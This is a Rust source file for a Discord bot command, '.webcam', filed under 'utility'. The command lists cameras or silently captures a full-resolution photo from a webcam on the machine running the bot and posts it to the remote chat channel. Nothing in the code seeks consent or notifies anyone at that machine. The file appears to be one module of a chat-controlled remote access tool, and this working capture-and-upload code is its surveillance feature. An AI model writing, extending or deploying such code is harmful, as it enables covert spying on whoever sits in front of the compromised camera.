use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use twilight_model::http::attachment::Attachment;
use chrono::Utc;
use std::{env, fs};

use nokhwa::{
    pixel_format::RgbFormat,
    query as nokhwa_query,
    utils::{ApiBackend, CameraIndex, RequestedFormat, RequestedFormatType},
    Camera,
};

use image::{codecs::png::PngEncoder, ImageEncoder};

pub struct WebcamCommand;

#[async_trait]
impl BotCommand for WebcamCommand {
    fn name(&self) -> &str { "webcam" }
    fn description(&self) -> &str { "Capture webcam photo or list available cameras" }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".webcam [index|list]" }
    fn examples(&self) -> &'static [&'static str] {
        &[
            ".webcam",
            ".webcam 0",
            ".webcam 1",
            ".webcam list",
        ]
    }
    fn aliases(&self) -> &'static [&'static str] { &["cam", "camera"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = args.next().unwrap_or("0");

        if action == "list" {
            match nokhwa_query(ApiBackend::Auto) {
                Ok(cameras) => {
                    if cameras.is_empty() {
                        http.create_message(msg.channel_id)
                            .content("No webcams found")
                            .await?;
                        return Ok(());
                    }

                    let mut response = String::from("**Available Webcams:**\n```\n");
                    for cam in cameras.iter() {
                        response.push_str(&format!("[{}] {}\n", cam.index(), cam.human_name()));
                    }
                    response.push_str("```");

                    http.create_message(msg.channel_id)
                        .content(&response)
                        .await?;
                }
                Err(e) => {
                    http.create_message(msg.channel_id)
                        .content(&format!("Failed to query webcams: {}", e))
                        .await?;
                }
            }

            return Ok(());
        }

        let index_u32: u32 = action.parse().unwrap_or(0);

        http.create_message(msg.channel_id)
            .content(&format!("Accessing webcam {}...", index_u32))
            .await?;

        let temp_path = env::temp_dir().join(format!("webcam_{}.png", Utc::now().timestamp()));

        let capture_result = {
            let cam_index = CameraIndex::Index(index_u32);
            let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution);

            match Camera::new(cam_index, requested) {
                Ok(mut camera) => {
                    match camera.frame() {
                        Ok(frame) => {
                            match frame.decode_image::<RgbFormat>() {
                                Ok(decoded_image) => {
                                    let width = decoded_image.width();
                                    let height = decoded_image.height();
                                    let raw_data = decoded_image.into_raw();

                                    let mut png_data = Vec::new();
                                    let encoder = PngEncoder::new(&mut png_data);

                                    match encoder.write_image(&raw_data, width, height, image::ExtendedColorType::Rgb8) {
                                        Ok(_) => {
                                            match fs::write(&temp_path, &png_data) {
                                                Ok(_) => Ok(()),
                                                Err(e) => Err(anyhow::anyhow!("Failed to write PNG file: {}", e))
                                            }
                                        }
                                        Err(e) => Err(anyhow::anyhow!("Failed to encode PNG: {}", e))
                                    }
                                }
                                Err(e) => Err(anyhow::anyhow!("Failed to decode frame: {}", e))
                            }
                        }
                        Err(e) => Err(anyhow::anyhow!("Failed to capture frame: {}", e))
                    }
                }
                Err(e) => Err(anyhow::anyhow!("Failed to open webcam: {}", e))
            }
        };

        match capture_result {
            Ok(_) => {
                match fs::read(&temp_path) {
                    Ok(image_data) => {
                        let attachment = Attachment::from_bytes(
                            format!("webcam_{}.png", index_u32),
                            image_data,
                            1
                        );

                        http.create_message(msg.channel_id)
                            .content(&format!("Webcam `{}` capture:", index_u32))
                            .attachments(&[attachment])
                            .await?;

                        let _ = fs::remove_file(&temp_path);
                    }
                    Err(e) => {
                        http.create_message(msg.channel_id)
                            .content(&format!("Failed to read captured image: {}", e))
                            .await?;
                    }
                }
            }
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("**Error**: {}", e))
                    .await?;
            }
        }

        Ok(())
    }
}
